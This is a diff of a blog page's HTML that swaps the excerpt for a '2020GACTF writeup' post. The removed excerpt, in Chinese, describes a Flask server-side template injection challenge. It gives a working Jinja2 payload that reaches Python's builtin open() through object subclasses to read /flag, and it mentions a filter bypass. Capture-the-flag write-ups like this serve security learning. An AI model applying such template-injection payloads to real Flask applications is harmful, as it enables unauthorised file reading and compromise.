@@ -351,11 +351,9 @@
                 <span>2020GACTF writeup</span>
         </a>
         <div class="abstract-content">
-            simpleflaskhttp://124.70.153.63/
-POST访问后提示request.form[“name”]，传入name进行测试，发现存在flask ssti,但是禁用了一些字符，构造以下payload获取flag
-1name=&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__["__builtins__"]["open"]("/FLAG".lower()).read()&#125;&#125;
-绕过：
-(&#39;-&gt;&quot;、/flag-&gt;&quot;...
+            EZFLASKhttp://124.70.206.91:10001/
+
+123456789101112131415161718192021222324# -*- coding: utf-8 -*-from flask import Flask, requestimport requestsfrom waf import *import timeapp = Flask(__name__)	@app.route('/ctfhint')def ctf():    hint =xxxx # hints    trick = xxxx # trick    return trick	@app.ro...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
